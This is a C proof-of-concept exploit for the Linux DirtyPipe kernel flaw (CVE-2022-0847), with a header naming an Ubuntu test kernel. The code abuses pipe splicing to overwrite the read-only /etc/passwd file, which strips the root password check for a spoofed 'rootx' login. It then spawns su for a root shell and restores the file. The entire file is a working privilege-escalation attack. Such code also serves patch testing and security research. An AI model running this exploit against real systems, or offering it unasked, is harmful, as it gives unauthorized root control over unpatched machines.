/*
PoC for CVE-2022-0847 (DirtyPipe)

Test Environment
    Ubuntu 20.04.4 LTS
    Linux ubuntu 5.13.0-30-generic #33~20.04.1-Ubuntu SMP Mon Feb 7 14:25:10 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

#define PAGESZ (0x1000)

int prepare_pipe(int *pfd);
int dirty_pipe(int *pfd, const char *pathname, off_t pos, char *payload, size_t len);

int main(void){
	int pfd[2];

	if(prepare_pipe(pfd) < 0)
		return -1;

	// "root:x:0:0:root:/root:/bin/bash" to "rootx::0:0:root:/root:/bin/bash"
	if(dirty_pipe(pfd, "/etc/passwd", 4, "x:", 2) < 0)
		return -1;

	switch(fork()){
		case -1:
			perror("fork");
			return -1;
		case 0:
			execv("/usr/bin/su", (char*[4]){"su", "-", "rootx", NULL});
			perror("execv");
			return -1;
		default:
			// restore
			sleep(1);
			dirty_pipe(pfd, "/etc/passwd", 4, ":x", 2);
			wait(NULL);
	}

	return 0;
}

int prepare_pipe(int *pfd){
	unsigned pipe_sz;
	char buf[PAGESZ];

	if(pipe2(pfd, O_CLOEXEC) || (int)(pipe_sz = fcntl(pfd[1], F_GETPIPE_SZ)) < 0)
		return -1;

	for(int i = 0; i < pipe_sz/PAGESZ; i++)
		write(pfd[1], buf, PAGESZ);

	fcntl(pfd[1], F_SETFL, O_NONBLOCK);

	return 0;
}

int dirty_pipe(int *pfd, const char *pathname, off_t pos, char *payload, size_t len){
	int fd, ret = -1;
	char buf[PAGESZ];

	for(int i = 0; i < 2; i++)
		read(pfd[0], buf, PAGESZ);

	if((fd = open(pathname, O_RDONLY)) < 0){
		perror("open");
		return -1;
	}

	lseek(fd, pos-1, SEEK_SET);
	if(splice(fd, NULL, pfd[1], NULL, 1, 0) < 1){
		perror("splice");
		goto err;
	}

	if(write(pfd[1], payload, len) < 0){
		perror("write");
		goto err;
	}

	ret = 0;

err:
	close(fd);
	return ret;
}
